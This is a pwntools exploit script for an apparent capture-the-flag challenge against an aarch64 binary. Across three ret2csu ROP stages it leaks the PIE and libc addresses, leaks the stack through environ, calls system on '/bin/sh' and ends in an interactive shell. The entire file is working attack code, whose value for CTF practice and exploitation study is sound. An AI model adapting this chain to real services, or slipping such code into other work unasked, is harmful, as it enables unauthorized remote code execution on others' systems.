#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe  = pwn.context.binary = pwn.ELF('./chroot/vuln')
libc = pwn.ELF("./chroot/lib/libc.so.6")
pwn.context.terminal = ["tilix","-a","session-add-right","-e"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False

host = pwn.args.HOST or 'pwn.zh3r0.cf'
port = int(pwn.args.PORT or 1111)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        bt = pwn.process(["./chroot/qemu-aarch64", "-g", "9191", "-L" , "./chroot", "-nx", exe.path] + argv, *a, **kw)    
        if os.fork() == 0:
            a = open("/tmp/gdb.gdb", "w")
            a.write(gdbscript)
            a.close()
            cmd = " ".join(pwn.context.terminal) + " gdb-multiarch %s -x /tmp/gdb.gdb" % exe.path
            os.system(cmd)
            os.kill(os.getpid(), 9)

        return bt    
    else:
        return pwn.process(["./chroot/qemu-aarch64", "-L" , "./chroot", "-nx", exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
target remote :9191
#break *$rebase(0x914)
break *$rebase(0x0864)
continue
'''

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

def GetOffsetStdin():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process(exe.path)
    p.sendline(pwn.cyclic(512))
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst


def GetOffsetArgv():
    log_level = pwn.context.log_level
    pwn.context.log_level = 'critical'
    p = pwn.process([exe.path, cyclic(512)])
    p.wait()
    time.sleep(2)
    core = p.corefile
    fault = core.fault_addr
    ofst = pwn.cyclic_find(fault & 0xffffffff)
    p.close()
    pwn.context.log_level = log_level
    return ofst

io.sendlineafter("Enter your name: ", "A" * 7)
io.recvline()
exe.address = pwn.u64(io.recv(4).strip().ljust(8, b"\x00")) - 0x8a8
pwn.info("PIE base : 0x%x" % exe.address)

#   LDR             X3, [X21,X19,LSL#3]         ; call x19(w22, x23, x24)
#   MOV             X2, X24                     ; call x19(w22, x23, x24)
#   ADD             X19, X19, #1                ; call x19(w22, x23, x24)
#   MOV             X1, X23                     ; call x19(w22, x23, x24)
#   MOV             W0, W22                     ; call x19(w22, x23, x24)
#   BLR             X3
#   CMP             X20, X19
#   B.NE            loc_900
#   
#   LDP             X19, X20, [SP,#var_s10]     ; control x19-x24, x29,x30
#   LDP             X21, X22, [SP,#var_s20]     ; control x19-x24, x29,x30
#   LDP             X23, X24, [SP,#var_s30]     ; control x19-x24, x29,x30
#   LDP             X29, X30, [SP+var_s0],#0x40 ; control x19-x24, x29,x30
#   RET

csu = exe.address + 0x900
gdt = exe.address + 0x920
fmt = exe.address + 0x95f

stage_1  = b"A" * 40
stage_1 += pwn.p64(gdt)
stage_1 += b"AAAAAAAA"                      # x29
stage_1 += pwn.p64(csu)                     # x30
stage_1 += pwn.p64(0x00)                    # x19
stage_1 += pwn.p64(1)                       # x20
stage_1 += pwn.p64(exe.got['printf'])       # x21
stage_1 += pwn.p64(fmt)                     # x22
stage_1 += pwn.p64(exe.got['read'])         # x23
stage_1 += pwn.p64(0x00)                    # x24
stage_1 += pwn.p64(0xdeadbeefc0debabe)
stage_1 += pwn.p64(exe.entry)

#stage_1 += csu_rop(exe.got['printf'], exe.got['read'], 0, 0)
io.sendlineafter("; send me your message now: ", stage_1)

libc.address = pwn.u64(io.recv(4).strip().ljust(8, b"\x00")) - libc.symbols['read']
pwn.info("Libc : 0x%x" % libc.address)

bin_sh = libc.address + 0x1265D0

stage_2  = b"A" * 40
stage_2 += pwn.p64(gdt)
stage_2 += b"AAAAAAAA"                      # x29
stage_2 += pwn.p64(csu)                     # x30
stage_2 += pwn.p64(0x00)                    # x19
stage_2 += pwn.p64(1)                       # x20
stage_2 += pwn.p64(exe.got['printf'])       # x21
stage_2 += pwn.p64(fmt)                     # x22
stage_2 += pwn.p64(libc.symbols['environ']) # x23
stage_2 += pwn.p64(0x00)                    # x24
stage_2 += pwn.p64(0x00)
stage_2 += pwn.p64(exe.entry)

io.sendlineafter("Enter your name: ", "X3eRo0")

io.sendlineafter("; send me your message now: ", stage_2)

stack = pwn.u64(io.recv(6).strip().ljust(8, b"\x00"))
pwn.info("Stack   : 0x%x" % stack)
pwn.info("Environ : 0x%x" % libc.symbols['environ'])

offset = stack - 0x308 + (40 + 8)

stage_3  = b"A" * 40
stage_3 += pwn.p64(gdt)
stage_3 += pwn.p64(libc.symbols['system'])  # x29
stage_3 += pwn.p64(csu)                     # x30
stage_3 += pwn.p64(0x00)                    # x19
stage_3 += pwn.p64(0x01)                    # x20
stage_3 += pwn.p64(offset)                  # x21
stage_3 += pwn.p64(bin_sh)                  # x22
stage_3 += pwn.p64(0x00)                    # x23
stage_3 += pwn.p64(0x00)                    # x24
stage_3 += pwn.p64(0x00)
stage_3 += pwn.p64(exe.entry)


io.sendlineafter("Enter your name: ", "X3eRo0")
io.sendlineafter("; send me your message now: ", stage_3)
io.interactive()